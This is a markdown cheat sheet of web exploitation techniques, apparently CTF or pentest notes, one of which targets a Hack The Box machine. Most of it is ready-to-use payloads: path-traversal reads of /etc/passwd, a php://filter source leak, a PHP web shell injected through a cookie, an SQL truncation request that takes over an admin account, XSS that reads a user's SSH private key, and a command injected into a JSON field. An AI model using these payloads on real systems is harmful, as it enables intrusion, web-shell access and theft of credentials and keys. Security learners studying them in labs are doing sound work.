# Exploitation Techniques

### LFI
#### Displaying the contents of files

```
http://<url>?attr=../../../../../../../../../etc/passwd
```

#### Finding hidden information in encoded format

```
http://<url>?page=php://filter/convert.base64-encode/resource=index
```

#### If a cookie is vulnerable

- Vulnerable PHP code
```php
<?php 
if (isset($_COOKIE["lang"]))
{
    include("lang/".$_COOKIE['lang']);
}
?>
```

- Change "Cookie" in request headers while sending the request to get web shell
```
Cookie: lang?=<?php echo system($_GET["cmd"]);?>
```

#### SQL Truncation attack

- if the website has some limit on username or email fields

```javascript
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
```

- so this script shows us that the input in the fields should be limited to a set number of characters. 
- If we create an account with a name like "admin        hello", the script will truncate all characters after the 10th character, and our name will become admin
- For this the form must allow entering spaces

- the webpage seems to perform a client side email validation, to bypass that, we craft our request using burp

```
POST /index.php HTTP/1.1
Host: book.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://book.htb/index.php
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 61

name=admin+++++a&email=admin%40book.htb++++++a&password=hello
```

#### XSS attack for LFI if some files are dynamically generated

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

- We can use this method to find other interesting files, like id_rsa
```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

#### OS Command Injection in JSON body of POST Request

- if any of the values in the request body's parameters is fetched as a result of any command running on the machine, the we can use command injection to get a reverse shell
```bash
{
    "name": "tommy", 
    "species": "dog;cat /etc/passwd" # --> here the value of species was coming from the result of '/bin/sh -c "cat characteristic/dog"'
}
```

